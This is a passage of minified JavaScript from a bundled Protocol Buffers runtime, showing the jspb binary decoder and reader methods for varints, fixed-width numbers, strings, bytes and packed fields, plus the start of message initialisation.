                    t = String.fromCharCode(16 * re(e.charCodeAt(2 * r + 2)) + re(e.charCodeAt(2 * r + 3))) + t;
                return t
            }
            ), void 0),
            u("jspb.utils.hash64ToNumber", (function(e, t) {
                z(e),
                e = M;
                var r = N;
                return t ? H(e, r) : V(e, r)
            }
            ), void 0),
            u("jspb.utils.numberToHash64", (function(e) {
                return U(e),
                Y(M, N)
            }
            ), void 0),
            u("jspb.utils.countVarints", (function(e, t, r) {
                for (var n = 0, o = t; o < r; o++)
                    n += e[o] >> 7;
                return r - t - n
            }
            ), void 0),
            u("jspb.utils.countVarintFields", (function(e, t, r, n) {
                var o = 0;
                if (128 > (n *= 8))
                    for (; t < r && e[t++] == n; )
                        for (o++; ; ) {
                            var i = e[t++];
                            if (0 == (128 & i))
                                break
                        }
                else
                    for (; t < r; ) {
                        for (i = n; 128 < i; ) {
                            if (e[t] != (127 & i | 128))
                                return o;
                            t++,
                            i >>= 7
                        }
                        if (e[t++] != i)
                            break;
                        for (o++; 0 != (128 & (i = e[t++])); )
                            ;
                    }
                return o
            }
            ), void 0),
            u("jspb.utils.countFixed32Fields", (function(e, t, r, n) {
                return ne(e, t, r, 8 * n + 5, 4)
            }
            ), void 0),
            u("jspb.utils.countFixed64Fields", (function(e, t, r, n) {
                return ne(e, t, r, 8 * n + 1, 8)
            }
            ), void 0),
            u("jspb.utils.countDelimitedFields", (function(e, t, r, n) {
                var o = 0;
                for (n = 8 * n + 2; t < r; ) {
                    for (var i = n; 128 < i; ) {
                        if (e[t++] != (127 & i | 128))
                            return o;
                        i >>= 7
                    }
                    if (e[t++] != i)
                        break;
                    o++;
                    for (var s = 0, a = 1; s += (127 & (i = e[t++])) * a,
                    a *= 128,
                    0 != (128 & i); )
                        ;
                    t += s
                }
                return o
            }
            ), void 0),
            u("jspb.utils.debugBytesToTextFormat", (function(e) {
                var t = '"';
                if (e) {
                    e = oe(e);
                    for (var r = 0; r < e.length; r++)
                        t += "\\x",
                        16 > e[r] && (t += "0"),
                        t += e[r].toString(16)
                }
                return t + '"'
            }
            ), void 0),
            u("jspb.utils.debugScalarToTextFormat", (function(e) {
                if ("string" === typeof e) {
                    e = String(e);
                    for (var t = ['"'], r = 0; r < e.length; r++) {
                        var n, o = e.charAt(r), i = o.charCodeAt(0), s = r + 1;
                        (n = B[o]) || (31 < i && 127 > i || ((i = o)in x ? o = x[i] : i in B ? o = x[i] = B[i] : (31 < (n = i.charCodeAt(0)) && 127 > n ? o = i : (256 > n ? (o = "\\x",
                        (16 > n || 256 < n) && (o += "0")) : (o = "\\u",
                        4096 > n && (o += "0")),
                        o += n.toString(16).toUpperCase()),
                        o = x[i] = o)),
                        n = o),
                        t[s] = n
                    }
                    t.push('"'),
                    e = t.join("")
                } else
                    e = e.toString();
                return e
            }
            ), void 0),
            u("jspb.utils.stringToByteArray", (function(e) {
                for (var t = new Uint8Array(e.length), r = 0; r < e.length; r++) {
                    var n = e.charCodeAt(r);
                    if (255 < n)
                        throw Error("Conversion error: string contains codepoint outside of byte range");
                    t[r] = n
                }
                return t
            }
            ), void 0),
            u("jspb.utils.byteSourceToUint8Array", oe, void 0),
            u("jspb.BinaryDecoder", ie, void 0);
            var se = [];
            function ae(e, t, r) {
                if (se.length) {
                    var n = se.pop();
                    return e && n.H(e, t, r),
                    n
                }
                return new ie(e,t,r)
            }
            function ce(e, t, r) {
                this.a = ae(e, t, r),
                this.O = this.a.B(),
                this.b = this.c = -1,
                this.h = !1,
                this.v = null
            }
            ie.getInstanceCacheLength = function() {
                return se.length
            }
            ,
            ie.alloc = ae,
            ie.prototype.Ca = function() {
                this.clear(),
                100 > se.length && se.push(this)
            }
            ,
            ie.prototype.free = ie.prototype.Ca,
            ie.prototype.clone = function() {
                return ae(this.b, this.h, this.c - this.h)
            }
            ,
            ie.prototype.clone = ie.prototype.clone,
            ie.prototype.clear = function() {
                this.b = null,
                this.a = this.c = this.h = 0,
                this.v = !1
            }
            ,
            ie.prototype.clear = ie.prototype.clear,
            ie.prototype.Y = function() {
                return this.b
            }
            ,
            ie.prototype.getBuffer = ie.prototype.Y,
            ie.prototype.H = function(e, t, r) {
                this.b = oe(e),
                this.h = void 0 !== t ? t : 0,
                this.c = void 0 !== r ? this.h + r : this.b.length,
                this.a = this.h
            }
            ,
            ie.prototype.setBlock = ie.prototype.H,
            ie.prototype.Db = function() {
                return this.c
            }
            ,
            ie.prototype.getEnd = ie.prototype.Db,
            ie.prototype.setEnd = function(e) {
                this.c = e
            }
            ,
            ie.prototype.setEnd = ie.prototype.setEnd,
            ie.prototype.reset = function() {
                this.a = this.h
            }
            ,
            ie.prototype.reset = ie.prototype.reset,
            ie.prototype.B = function() {
                return this.a
            }
            ,
            ie.prototype.getCursor = ie.prototype.B,
            ie.prototype.Ma = function(e) {
                this.a = e
            }
            ,
            ie.prototype.setCursor = ie.prototype.Ma,
            ie.prototype.advance = function(e) {
                this.a += e,
                b(this.a <= this.c)
            }
            ,
            ie.prototype.advance = ie.prototype.advance,
            ie.prototype.ya = function() {
                return this.a == this.c
            }
            ,
            ie.prototype.atEnd = ie.prototype.ya,
            ie.prototype.Qb = function() {
                return this.a > this.c
            }
            ,
            ie.prototype.pastEnd = ie.prototype.Qb,
            ie.prototype.getError = function() {
                return this.v || 0 > this.a || this.a > this.c
            }
            ,
            ie.prototype.getError = ie.prototype.getError,
            ie.prototype.w = function(e) {
                for (var t = 128, r = 0, n = 0, o = 0; 4 > o && 128 <= t; o++)
                    r |= (127 & (t = this.b[this.a++])) << 7 * o;
                if (128 <= t && (r |= (127 & (t = this.b[this.a++])) << 28,
                n |= (127 & t) >> 4),
                128 <= t)
                    for (o = 0; 5 > o && 128 <= t; o++)
                        n |= (127 & (t = this.b[this.a++])) << 7 * o + 3;
                if (128 > t)
                    return e(r >>> 0, n >>> 0);
                v("Failed to read varint, encoding is invalid."),
                this.v = !0
            }
            ,
            ie.prototype.readSplitVarint64 = ie.prototype.w,
            ie.prototype.ea = function(e) {
                return this.w((function(t, r) {
                    return $(t, r, e)
                }
                ))
            }
            ,
            ie.prototype.readSplitZigzagVarint64 = ie.prototype.ea,
            ie.prototype.ta = function(e) {
                var t = this.b
                  , r = this.a;
                this.a += 8;
                for (var n = 0, o = 0, i = r + 7; i >= r; i--)
                    n = n << 8 | t[i],
                    o = o << 8 | t[i + 4];
                return e(n, o)
            }
            ,
            ie.prototype.readSplitFixed64 = ie.prototype.ta,
            ie.prototype.kb = function() {
                for (; 128 & this.b[this.a]; )
                    this.a++;
                this.a++
            }
            ,
            ie.prototype.skipVarint = ie.prototype.kb,
            ie.prototype.mb = function(e) {
                for (; 128 < e; )
                    this.a--,
                    e >>>= 7;
                this.a--
            }
            ,
            ie.prototype.unskipVarint = ie.prototype.mb,
            ie.prototype.o = function() {
                var e = this.b
                  , t = e[this.a]
                  , r = 127 & t;
                return 128 > t ? (this.a += 1,
                b(this.a <= this.c),
                r) : (r |= (127 & (t = e[this.a + 1])) << 7,
                128 > t ? (this.a += 2,
                b(this.a <= this.c),
                r) : (r |= (127 & (t = e[this.a + 2])) << 14,
                128 > t ? (this.a += 3,
                b(this.a <= this.c),
                r) : (r |= (127 & (t = e[this.a + 3])) << 21,
                128 > t ? (this.a += 4,
                b(this.a <= this.c),
                r) : (r |= (15 & (t = e[this.a + 4])) << 28,
                128 > t ? (this.a += 5,
                b(this.a <= this.c),
                r >>> 0) : (this.a += 5,
                128 <= e[this.a++] && 128 <= e[this.a++] && 128 <= e[this.a++] && 128 <= e[this.a++] && 128 <= e[this.a++] && b(!1),
                b(this.a <= this.c),
                r)))))
            }
            ,
            ie.prototype.readUnsignedVarint32 = ie.prototype.o,
            ie.prototype.da = function() {
                return ~~this.o()
            }
            ,
            ie.prototype.readSignedVarint32 = ie.prototype.da,
            ie.prototype.O = function() {
                return this.o().toString()
            }
            ,
            ie.prototype.Ea = function() {
                return this.da().toString()
            }
            ,
            ie.prototype.readSignedVarint32String = ie.prototype.Ea,
            ie.prototype.Ia = function() {
                var e = this.o();
                return e >>> 1 ^ -(1 & e)
            }
            ,
            ie.prototype.readZigzagVarint32 = ie.prototype.Ia,
            ie.prototype.Ga = function() {
                return this.w(V)
            }
            ,
            ie.prototype.readUnsignedVarint64 = ie.prototype.Ga,
            ie.prototype.Ha = function() {
                return this.w(J)
            }
            ,
            ie.prototype.readUnsignedVarint64String = ie.prototype.Ha,
            ie.prototype.sa = function() {
                return this.w(H)
            }
            ,
            ie.prototype.readSignedVarint64 = ie.prototype.sa,
            ie.prototype.Fa = function() {
                return this.w(X)
            }
            ,
            ie.prototype.readSignedVarint64String = ie.prototype.Fa,
            ie.prototype.Ja = function() {
                return this.w(G)
            }
            ,
            ie.prototype.readZigzagVarint64 = ie.prototype.Ja,
            ie.prototype.fb = function() {
                return this.ea(Y)
            }
            ,
            ie.prototype.readZigzagVarintHash64 = ie.prototype.fb,
            ie.prototype.Ka = function() {
                return this.ea(X)
            }
            ,
            ie.prototype.readZigzagVarint64String = ie.prototype.Ka,
            ie.prototype.Gc = function() {
                var e = this.b[this.a];
                return this.a += 1,
                b(this.a <= this.c),
                e
            }
            ,
            ie.prototype.readUint8 = ie.prototype.Gc,
            ie.prototype.Ec = function() {
                var e = this.b[this.a]
                  , t = this.b[this.a + 1];
                return this.a += 2,
                b(this.a <= this.c),
                e | t << 8
            }
            ,
            ie.prototype.readUint16 = ie.prototype.Ec,
            ie.prototype.m = function() {
                var e = this.b[this.a]
                  , t = this.b[this.a + 1]
                  , r = this.b[this.a + 2]
                  , n = this.b[this.a + 3];
                return this.a += 4,
                b(this.a <= this.c),
                (e | t << 8 | r << 16 | n << 24) >>> 0
            }
            ,
            ie.prototype.readUint32 = ie.prototype.m,
            ie.prototype.ga = function() {
                return V(this.m(), this.m())
            }
            ,
            ie.prototype.readUint64 = ie.prototype.ga,
            ie.prototype.ha = function() {
                return J(this.m(), this.m())
            }
            ,
            ie.prototype.readUint64String = ie.prototype.ha,
            ie.prototype.Xb = function() {
                var e = this.b[this.a];
                return this.a += 1,
                b(this.a <= this.c),
                e << 24 >> 24
            }
            ,
            ie.prototype.readInt8 = ie.prototype.Xb,
            ie.prototype.Vb = function() {
                var e = this.b[this.a]
                  , t = this.b[this.a + 1];
                return this.a += 2,
                b(this.a <= this.c),
                (e | t << 8) << 16 >> 16
            }
            ,
            ie.prototype.readInt16 = ie.prototype.Vb,
            ie.prototype.P = function() {
                var e = this.b[this.a]
                  , t = this.b[this.a + 1]
                  , r = this.b[this.a + 2]
                  , n = this.b[this.a + 3];
                return this.a += 4,
                b(this.a <= this.c),
                e | t << 8 | r << 16 | n << 24
            }
            ,
            ie.prototype.readInt32 = ie.prototype.P,
            ie.prototype.ba = function() {
                return H(this.m(), this.m())
            }
            ,
            ie.prototype.readInt64 = ie.prototype.ba,
            ie.prototype.ca = function() {
                return X(this.m(), this.m())
            }
            ,
            ie.prototype.readInt64String = ie.prototype.ca,
            ie.prototype.aa = function() {
                return K(this.m())
            }
            ,
            ie.prototype.readFloat = ie.prototype.aa,
            ie.prototype.Z = function() {
                return Z(this.m(), this.m())
            }
            ,
            ie.prototype.readDouble = ie.prototype.Z,
            ie.prototype.pa = function() {
                return !!this.b[this.a++]
            }
            ,
            ie.prototype.readBool = ie.prototype.pa,
            ie.prototype.ra = function() {
                return this.da()
            }
            ,
            ie.prototype.readEnum = ie.prototype.ra,
            ie.prototype.fa = function(e) {
                var t = this.b
                  , r = this.a;
                e = r + e;
                for (var n = [], o = ""; r < e; ) {
                    var i = t[r++];
                    if (128 > i)
                        n.push(i);
                    else {
                        if (192 > i)
                            continue;
                        if (224 > i) {
                            var s = t[r++];
                            n.push((31 & i) << 6 | 63 & s)
                        } else if (240 > i) {
                            s = t[r++];
                            var a = t[r++];
                            n.push((15 & i) << 12 | (63 & s) << 6 | 63 & a)
                        } else if (248 > i) {
                            i = (7 & i) << 18 | (63 & (s = t[r++])) << 12 | (63 & (a = t[r++])) << 6 | 63 & t[r++],
                            i -= 65536,
                            n.push(55296 + (i >> 10 & 1023), 56320 + (1023 & i))
                        }
                    }
                    8192 <= n.length && (o += String.fromCharCode.apply(null, n),
                    n.length = 0)
                }
                return o += I(n),
                this.a = r,
                o
            }
            ,
            ie.prototype.readString = ie.prototype.fa,
            ie.prototype.Dc = function() {
                var e = this.o();
                return this.fa(e)
            }
            ,
            ie.prototype.readStringWithLength = ie.prototype.Dc,
            ie.prototype.qa = function(e) {
                if (0 > e || this.a + e > this.b.length)
                    return this.v = !0,
                    v("Invalid byte length!"),
                    new Uint8Array(0);
                var t = this.b.subarray(this.a, this.a + e);
                return this.a += e,
                b(this.a <= this.c),
                t
            }
            ,
            ie.prototype.readBytes = ie.prototype.qa,
            ie.prototype.ia = function() {
                return this.w(Y)
            }
            ,
            ie.prototype.readVarintHash64 = ie.prototype.ia,
            ie.prototype.$ = function() {
                var e = this.b
                  , t = this.a
                  , r = e[t]
                  , n = e[t + 1]
                  , o = e[t + 2]
                  , i = e[t + 3]
                  , s = e[t + 4]
                  , a = e[t + 5]
                  , c = e[t + 6];
                return e = e[t + 7],
                this.a += 8,
                String.fromCharCode(r, n, o, i, s, a, c, e)
            }
            ,
            ie.prototype.readFixedHash64 = ie.prototype.$,
            u("jspb.BinaryReader", ce, void 0);
            var le = [];
            function ue(e, t, r) {
                if (le.length) {
                    var n = le.pop();
                    return e && n.a.H(e, t, r),
                    n
                }
                return new ce(e,t,r)
            }
            function de(e, t) {
                b(2 == e.b);
                var r = e.a.o();
                r = e.a.B() + r;
                for (var n = []; e.a.B() < r; )
                    n.push(t.call(e.a));
                return n
            }
            function he(e, t, r, n, o) {
                this.ma = e,
                this.Ba = t,
                this.la = r,
                this.Na = n,
                this.na = o
            }
            function fe(e, t, r, n, o, i) {
                this.Za = e,
                this.za = t,
                this.Aa = r,
                this.Wa = n,
                this.Ab = o,
                this.Nb = i
            }
            function pe() {}
            ce.clearInstanceCache = function() {
                le = []
            }
            ,
            ce.getInstanceCacheLength = function() {
                return le.length
            }
            ,
            ce.alloc = ue,
            ce.prototype.zb = ue,
            ce.prototype.alloc = ce.prototype.zb,
            ce.prototype.Ca = function() {
                this.a.clear(),
                this.b = this.c = -1,
                this.h = !1,
                this.v = null,
                100 > le.length && le.push(this)
            }
            ,
            ce.prototype.free = ce.prototype.Ca,
            ce.prototype.Fb = function() {
                return this.O
            }
            ,
            ce.prototype.getFieldCursor = ce.prototype.Fb,
            ce.prototype.B = function() {
                return this.a.B()
            }
            ,
            ce.prototype.getCursor = ce.prototype.B,
            ce.prototype.Y = function() {
                return this.a.Y()
            }
            ,
            ce.prototype.getBuffer = ce.prototype.Y,
            ce.prototype.Hb = function() {
                return this.c
            }
            ,
            ce.prototype.getFieldNumber = ce.prototype.Hb,
            ce.prototype.Lb = function() {
                return this.b
            }
            ,
            ce.prototype.getWireType = ce.prototype.Lb,
            ce.prototype.Mb = function() {
                return 2 == this.b
            }
            ,
            ce.prototype.isDelimited = ce.prototype.Mb,
            ce.prototype.bb = function() {
                return 4 == this.b
            }
            ,
            ce.prototype.isEndGroup = ce.prototype.bb,
            ce.prototype.getError = function() {
                return this.h || this.a.getError()
            }
            ,
            ce.prototype.getError = ce.prototype.getError,
            ce.prototype.H = function(e, t, r) {
                this.a.H(e, t, r),
                this.b = this.c = -1
            }
            ,
            ce.prototype.setBlock = ce.prototype.H,
            ce.prototype.reset = function() {
                this.a.reset(),
                this.b = this.c = -1
            }
            ,
            ce.prototype.reset = ce.prototype.reset,
            ce.prototype.advance = function(e) {
                this.a.advance(e)
            }
            ,
            ce.prototype.advance = ce.prototype.advance,
            ce.prototype.oa = function() {
                if (this.a.ya())
                    return !1;
                if (this.getError())
                    return v("Decoder hit an error"),
                    !1;
                this.O = this.a.B();
                var e = this.a.o()
                  , t = e >>> 3;
                return 0 != (e &= 7) && 5 != e && 1 != e && 2 != e && 3 != e && 4 != e ? (v("Invalid wire type: %s (at position %s)", e, this.O),
                this.h = !0,
                !1) : (this.c = t,
                this.b = e,
                !0)
            }
            ,
            ce.prototype.nextField = ce.prototype.oa,
            ce.prototype.Oa = function() {
                this.a.mb(this.c << 3 | this.b)
            }
            ,
            ce.prototype.unskipHeader = ce.prototype.Oa,
            ce.prototype.Lc = function() {
                var e = this.c;
                for (this.Oa(); this.oa() && this.c == e; )
                    this.C();
                this.a.ya() || this.Oa()
            }
            ,
            ce.prototype.skipMatchingFields = ce.prototype.Lc,
            ce.prototype.lb = function() {
                0 != this.b ? (v("Invalid wire type for skipVarintField"),
                this.C()) : this.a.kb()
            }
            ,
            ce.prototype.skipVarintField = ce.prototype.lb,
            ce.prototype.gb = function() {
                if (2 != this.b)
                    v("Invalid wire type for skipDelimitedField"),
                    this.C();
                else {
                    var e = this.a.o();
                    this.a.advance(e)
                }
            }
            ,
            ce.prototype.skipDelimitedField = ce.prototype.gb,
            ce.prototype.hb = function() {
                5 != this.b ? (v("Invalid wire type for skipFixed32Field"),
                this.C()) : this.a.advance(4)
            }
            ,
            ce.prototype.skipFixed32Field = ce.prototype.hb,
            ce.prototype.ib = function() {
                1 != this.b ? (v("Invalid wire type for skipFixed64Field"),
                this.C()) : this.a.advance(8)
            }
            ,
            ce.prototype.skipFixed64Field = ce.prototype.ib,
            ce.prototype.jb = function() {
                for (var e = this.c; ; ) {
                    if (!this.oa()) {
                        v("Unmatched start-group tag: stream EOF"),
                        this.h = !0;
                        break
                    }
                    if (4 == this.b) {
                        this.c != e && (v("Unmatched end-group tag"),
                        this.h = !0);
                        break
                    }
                    this.C()
                }
            }
            ,
            ce.prototype.skipGroup = ce.prototype.jb,
            ce.prototype.C = function() {
                switch (this.b) {
                case 0:
                    this.lb();
                    break;
                case 1:
                    this.ib();
                    break;
                case 2:
                    this.gb();
                    break;
                case 5:
                    this.hb();
                    break;
                case 3:
                    this.jb();
                    break;
                default:
                    v("Invalid wire encoding for field.")
                }
            }
            ,
            ce.prototype.skipField = ce.prototype.C,
            ce.prototype.Hc = function(e, t) {
                null === this.v && (this.v = {}),
                b(!this.v[e]),
                this.v[e] = t
            }
            ,
            ce.prototype.registerReadCallback = ce.prototype.Hc,
            ce.prototype.Ic = function(e) {
                return b(null !== this.v),
                b(e = this.v[e]),
                e(this)
            }
            ,
            ce.prototype.runReadCallback = ce.prototype.Ic,
            ce.prototype.Yb = function(e, t) {
                b(2 == this.b);
                var r = this.a.c
                  , n = this.a.o();
                n = this.a.B() + n,
                this.a.setEnd(n),
                t(e, this),
                this.a.Ma(n),
                this.a.setEnd(r)
            }
            ,
            ce.prototype.readMessage = ce.prototype.Yb,
            ce.prototype.Ub = function(e, t, r) {
                b(3 == this.b),
                b(this.c == e),
                r(t, this),
                this.h || 4 == this.b || (v("Group submessage did not end with an END_GROUP tag"),
                this.h = !0)
            }
            ,
            ce.prototype.readGroup = ce.prototype.Ub,
            ce.prototype.Gb = function() {
                b(2 == this.b);
                var e = this.a.o()
                  , t = this.a.B()
                  , r = t + e;
                return e = ae(this.a.Y(), t, e),
                this.a.Ma(r),
                e
            }
            ,
            ce.prototype.getFieldDecoder = ce.prototype.Gb,
            ce.prototype.P = function() {
                return b(0 == this.b),
                this.a.da()
            }
            ,
            ce.prototype.readInt32 = ce.prototype.P,
            ce.prototype.Wb = function() {
                return b(0 == this.b),
                this.a.Ea()
            }
            ,
            ce.prototype.readInt32String = ce.prototype.Wb,
            ce.prototype.ba = function() {
                return b(0 == this.b),
                this.a.sa()
            }
            ,
            ce.prototype.readInt64 = ce.prototype.ba,
            ce.prototype.ca = function() {
                return b(0 == this.b),
                this.a.Fa()
            }
            ,
            ce.prototype.readInt64String = ce.prototype.ca,
            ce.prototype.m = function() {
                return b(0 == this.b),
                this.a.o()
            }
            ,
            ce.prototype.readUint32 = ce.prototype.m,
            ce.prototype.Fc = function() {
                return b(0 == this.b),
                this.a.O()
            }
            ,
            ce.prototype.readUint32String = ce.prototype.Fc,
            ce.prototype.ga = function() {
                return b(0 == this.b),
                this.a.Ga()
            }
            ,
            ce.prototype.readUint64 = ce.prototype.ga,
            ce.prototype.ha = function() {
                return b(0 == this.b),
                this.a.Ha()
            }
            ,
            ce.prototype.readUint64String = ce.prototype.ha,
            ce.prototype.zc = function() {
                return b(0 == this.b),
                this.a.Ia()
            }
            ,
            ce.prototype.readSint32 = ce.prototype.zc,
            ce.prototype.Ac = function() {
                return b(0 == this.b),
                this.a.Ja()
            }
            ,
            ce.prototype.readSint64 = ce.prototype.Ac,
            ce.prototype.Bc = function() {
                return b(0 == this.b),
                this.a.Ka()
            }
            ,
            ce.prototype.readSint64String = ce.prototype.Bc,
            ce.prototype.Rb = function() {
                return b(5 == this.b),
                this.a.m()
            }
            ,
            ce.prototype.readFixed32 = ce.prototype.Rb,
            ce.prototype.Sb = function() {
                return b(1 == this.b),
                this.a.ga()
            }
            ,
            ce.prototype.readFixed64 = ce.prototype.Sb,
            ce.prototype.Tb = function() {
                return b(1 == this.b),
                this.a.ha()
            }
            ,
            ce.prototype.readFixed64String = ce.prototype.Tb,
            ce.prototype.vc = function() {
                return b(5 == this.b),
                this.a.P()
            }
            ,
            ce.prototype.readSfixed32 = ce.prototype.vc,
            ce.prototype.wc = function() {
                return b(5 == this.b),
                this.a.P().toString()
            }
            ,
            ce.prototype.readSfixed32String = ce.prototype.wc,
            ce.prototype.xc = function() {
                return b(1 == this.b),
                this.a.ba()
            }
            ,
            ce.prototype.readSfixed64 = ce.prototype.xc,
            ce.prototype.yc = function() {
                return b(1 == this.b),
                this.a.ca()
            }
            ,
            ce.prototype.readSfixed64String = ce.prototype.yc,
            ce.prototype.aa = function() {
                return b(5 == this.b),
                this.a.aa()
            }
            ,
            ce.prototype.readFloat = ce.prototype.aa,
            ce.prototype.Z = function() {
                return b(1 == this.b),
                this.a.Z()
            }
            ,
            ce.prototype.readDouble = ce.prototype.Z,
            ce.prototype.pa = function() {
                return b(0 == this.b),
                !!this.a.o()
            }
            ,
            ce.prototype.readBool = ce.prototype.pa,
            ce.prototype.ra = function() {
                return b(0 == this.b),
                this.a.sa()
            }
            ,
            ce.prototype.readEnum = ce.prototype.ra,
            ce.prototype.fa = function() {
                b(2 == this.b);
                var e = this.a.o();
                return this.a.fa(e)
            }
            ,
            ce.prototype.readString = ce.prototype.fa,
            ce.prototype.qa = function() {
                b(2 == this.b);
                var e = this.a.o();
                return this.a.qa(e)
            }
            ,
            ce.prototype.readBytes = ce.prototype.qa,
            ce.prototype.ia = function() {
                return b(0 == this.b),
                this.a.ia()
            }
            ,
            ce.prototype.readVarintHash64 = ce.prototype.ia,
            ce.prototype.Cc = function() {
                return b(0 == this.b),
                this.a.fb()
            }
            ,
            ce.prototype.readSintHash64 = ce.prototype.Cc,
            ce.prototype.w = function(e) {
                return b(0 == this.b),
                this.a.w(e)
            }
            ,
            ce.prototype.readSplitVarint64 = ce.prototype.w,
            ce.prototype.ea = function(e) {
                return b(0 == this.b),
                this.a.w((function(t, r) {
                    return $(t, r, e)
                }
                ))
            }
            ,
            ce.prototype.readSplitZigzagVarint64 = ce.prototype.ea,
            ce.prototype.$ = function() {
                return b(1 == this.b),
                this.a.$()
            }
            ,
            ce.prototype.readFixedHash64 = ce.prototype.$,
            ce.prototype.ta = function(e) {
                return b(1 == this.b),
                this.a.ta(e)
            }
            ,
            ce.prototype.readSplitFixed64 = ce.prototype.ta,
            ce.prototype.gc = function() {
                return de(this, this.a.da)
            }
            ,
            ce.prototype.readPackedInt32 = ce.prototype.gc,
            ce.prototype.hc = function() {
                return de(this, this.a.Ea)
            }
            ,
            ce.prototype.readPackedInt32String = ce.prototype.hc,
            ce.prototype.ic = function() {
                return de(this, this.a.sa)
            }
            ,
            ce.prototype.readPackedInt64 = ce.prototype.ic,
            ce.prototype.jc = function() {
                return de(this, this.a.Fa)
            }
            ,
            ce.prototype.readPackedInt64String = ce.prototype.jc,
            ce.prototype.qc = function() {
                return de(this, this.a.o)
            }
            ,
            ce.prototype.readPackedUint32 = ce.prototype.qc,
            ce.prototype.rc = function() {
                return de(this, this.a.O)
            }
            ,
            ce.prototype.readPackedUint32String = ce.prototype.rc,
            ce.prototype.sc = function() {
                return de(this, this.a.Ga)
            }
            ,
            ce.prototype.readPackedUint64 = ce.prototype.sc,
            ce.prototype.tc = function() {
                return de(this, this.a.Ha)
            }
            ,
            ce.prototype.readPackedUint64String = ce.prototype.tc,
            ce.prototype.nc = function() {
                return de(this, this.a.Ia)
            }
            ,
            ce.prototype.readPackedSint32 = ce.prototype.nc,
            ce.prototype.oc = function() {
                return de(this, this.a.Ja)
            }
            ,
            ce.prototype.readPackedSint64 = ce.prototype.oc,
            ce.prototype.pc = function() {
                return de(this, this.a.Ka)
            }
            ,
            ce.prototype.readPackedSint64String = ce.prototype.pc,
            ce.prototype.bc = function() {
                return de(this, this.a.m)
            }
            ,
            ce.prototype.readPackedFixed32 = ce.prototype.bc,
            ce.prototype.cc = function() {
                return de(this, this.a.ga)
            }
            ,
            ce.prototype.readPackedFixed64 = ce.prototype.cc,
            ce.prototype.dc = function() {
                return de(this, this.a.ha)
            }
            ,
            ce.prototype.readPackedFixed64String = ce.prototype.dc,
            ce.prototype.kc = function() {
                return de(this, this.a.P)
            }
            ,
            ce.prototype.readPackedSfixed32 = ce.prototype.kc,
            ce.prototype.lc = function() {
                return de(this, this.a.ba)
            }
            ,
            ce.prototype.readPackedSfixed64 = ce.prototype.lc,
            ce.prototype.mc = function() {
                return de(this, this.a.ca)
            }
            ,
            ce.prototype.readPackedSfixed64String = ce.prototype.mc,
            ce.prototype.fc = function() {
                return de(this, this.a.aa)
            }
            ,
            ce.prototype.readPackedFloat = ce.prototype.fc,
            ce.prototype.$b = function() {
                return de(this, this.a.Z)
            }
            ,
            ce.prototype.readPackedDouble = ce.prototype.$b,
            ce.prototype.Zb = function() {
                return de(this, this.a.pa)
            }
            ,
            ce.prototype.readPackedBool = ce.prototype.Zb,
            ce.prototype.ac = function() {
                return de(this, this.a.ra)
            }
            ,
            ce.prototype.readPackedEnum = ce.prototype.ac,
            ce.prototype.uc = function() {
                return de(this, this.a.ia)
            }
            ,
            ce.prototype.readPackedVarintHash64 = ce.prototype.uc,
            ce.prototype.ec = function() {
                return de(this, this.a.$)
            }
            ,
            ce.prototype.readPackedFixedHash64 = ce.prototype.ec,
            u("jspb.ExtensionFieldInfo", he, void 0),
            u("jspb.ExtensionFieldBinaryInfo", fe, void 0),
            he.prototype.F = function() {
                return !!this.la
            }
            ,
            he.prototype.isMessageType = he.prototype.F,
            u("jspb.Message", pe, void 0),
            pe.GENERATE_TO_OBJECT = !0,
            pe.GENERATE_FROM_OBJECT = !0;
            var ge = "function" == typeof Uint8Array;
            pe.prototype.Ib = function() {
                return this.b
            }
            ,
            pe.prototype.getJsPbMessageId = pe.prototype.Ib,
            pe.initialize = function(e, t, r, n, o, i) {
                if (e.f = null,
                t || (t = r ? [r] : []),
                e.b = r ? String(r) : void 0,
                e.D = 0 === r ? -1 : 0,
                e.u = t,
                t = -1,
                !(r = e.u.length) || (t = r - 1,
                null === (r = e.u[t]) || "object" != typeof r || Array.isArray(r) || ge && r instanceof Uint8Array) ? -1 < n ? (e.G = Math.max(n, t + 1 - e.D),
                e.i = null) : e.G = Number.MAX_VALUE : (e.G = t - e.D,
                e.i = r),
                e.a = {},
                o)
                    for (n = 0; n < o.length; n++)
                        (t = o[n]) < e.G ? (t += e.D,
                        e.u[t] = e.u[t] || ye) : (me(e),
                        e.i[t] = e.i[t] || ye);
                if (i && i.length)
                    for (n = 0; n < i.length; n++)
                        xe(e, i[n])
            }
            ;
            var ye = Object.freeze ? Object.freeze([]) : [];
            function me(e) {
                var t = e.G + e.D;
                e.u[t] || (e.i = e.u[t] = {})
            }
            function be(e, t, r) {
                for (var n = [], o = 0; o < e.length; o++)
                    n[o] = t.call(e[o], r, e[o]);
                return n
            }
            function ve(e, t) {
                if (t < e.G) {
                    t += e.D;
                    var r = e.u[t];
                    return r === ye ? e.u[t] = [] : r
                }
                if (e.i)
                    return (r = e.i[t]) === ye ? e.i[t] = [] : r
            }
            function we(e, t) {
                return null == (e = ve(e, t)) ? e : +e
            }
            function Te(e, t) {
                return null == (e = ve(e, t)) ? e : !!e
            }
            function Ae(e) {
                return null == e || "string" === typeof e ? e : ge && e instanceof Uint8Array ? W(e) : (v("Cannot coerce to b64 string: " + d(e)),
                null)
            }
            function Ee(e) {
                return null == e || e instanceof Uint8Array ? e : "string" === typeof e ? R(e) : (v("Cannot coerce to Uint8Array: " + d(e)),
                null)
            }
            function Pe(e) {
                if (e && 1 < e.length) {
                    var t = d(e[0]);
                    p(e, (function(e) {
                        d(e) != t && v("Inconsistent type in JSPB repeated field array. Got " + d(e) + " expected " + t)
                    }
                    ))
                }
            }
            function Ce(e, t, r) {
                return null == (e = ve(e, t)) ? r : e
            }
            function Se(e, t, r) {
                return w(e, pe),
                t < e.G ? e.u[t + e.D] = r : (me(e),
                e.i[t] = r),
                e
            }
            function Ie(e, t, r, n) {
                return w(e, pe),
                r !== n ? Se(e, t, r) : t < e.G ? e.u[t + e.D] = null : (me(e),
                delete e.i[t]),
                e
            }
            function Be(e, t, r, n) {
                return w(e, pe),
                (r = xe(e, r)) && r !== t && void 0 !== n && (e.f && r in e.f && (e.f[r] = void 0),
                Se(e, r, void 0)),
                Se(e, t, n)
            }
            function xe(e, t) {
                for (var r, n, o = 0; o < t.length; o++) {
                    var i = t[o]
                      , s = ve(e, i);
                    null != s && (r = i,
                    n = s,
                    Se(e, i, void 0))
                }
                return r ? (Se(e, r, n),
                r) : 0
            }
            function Oe(e, t, r) {
                if (e.f || (e.f = {}),
                !e.f[r]) {
                    for (var n = ve(e, r), o = [], i = 0; i < n.length; i++)
